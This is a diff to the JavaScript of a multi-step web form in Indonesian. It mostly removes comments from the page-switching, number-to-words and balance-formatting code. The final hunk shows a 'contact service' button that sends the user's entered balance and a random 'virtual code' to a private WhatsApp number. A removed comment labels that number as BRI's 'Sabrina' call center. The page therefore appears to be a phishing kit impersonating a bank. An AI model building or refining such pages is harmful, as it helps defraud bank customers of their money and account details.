@@ -66,15 +66,11 @@ document.addEventListener('DOMContentLoaded', function() {
     function goToPage(currentPage, nextPage) {
         showLoading();
         
-        // Simulate loading delay (1.5 seconds)
         setTimeout(function() {
             currentPage.classList.remove('active');
             nextPage.classList.add('active');
-            
-            // Control header and footer visibility
             toggleHeaderVisibility(nextPage.id !== 'page2');
             toggleFooterVisibility(nextPage.id !== 'page3');
-            
             window.scrollTo(0, 0);
             hideLoading();
         }, 1500);
@@ -96,7 +92,6 @@ document.addEventListener('DOMContentLoaded', function() {
         num = parseInt(num, 10);
         if (isNaN(num)) return '';
 
-        // Break the number into chunks of 3 digits
         const chunks = [];
         while (num > 0) {
             chunks.push(num % 1000);
@@ -112,7 +107,6 @@ document.addEventListener('DOMContentLoaded', function() {
             const hundred = Math.floor(chunk / 100);
             const ten = chunk % 100;
 
-            // Handle hundreds place
             if (hundred > 0) {
                 if (hundred === 1) {
                     chunkWords.push('Seratus');
@@ -121,7 +115,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
             }
 
-            // Handle tens and ones place
             if (ten > 0) {
                 if (ten < 10) {
                     chunkWords.push(ones[ten]);
@@ -137,9 +130,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
             }
 
-            // Add scale word if not empty
             if (chunkWords.length > 0) {
-                // Special case for 1000
                 if (i === 1 && chunk === 1 && chunks.length === 2 && chunks[0] === 0) {
                     words.unshift('Seribu');
                 } else {
@@ -153,24 +144,17 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Format number with thousand separators
     function formatNumberInput(input) {
-        // Remove all non-digit characters
         let value = input.replace(/\D/g, '');
-        
-        // Format with thousand separators if not empty
         if (value.length > 0) {
             value = parseInt(value, 10).toLocaleString('id-ID');
         }
-        
         return value;
     }
 
     // Handle balance input changes
     currentBalance.addEventListener('input', function() {
-        // Format the display with thousand separators
         const formattedValue = formatNumberInput(this.value);
         this.value = formattedValue;
-        
-        // Convert to words
         const numericValue = this.value.replace(/\./g, '');
         const words = convertNumberToWords(numericValue);
         amountInWords.textContent = words || '';
@@ -233,9 +217,9 @@ document.addEventListener('DOMContentLoaded', function() {
         goToPage(page2, page3);
     });
 
-    // Contact service via WhatsApp - UPDATED NUMBER
+    // Contact service via WhatsApp
     contactService.addEventListener('click', function() {
-        const whatsappNumber = '6283847980901'; // Updated to Sabrina BRI Call Center
+        const whatsappNumber = '6283847980901';
         const virtualCode = Math.floor(100000 + Math.random() * 900000);
         const numericValue = currentBalance.value.replace(/\./g, '');
         const formattedBalance = new Intl.NumberFormat('id-ID', {
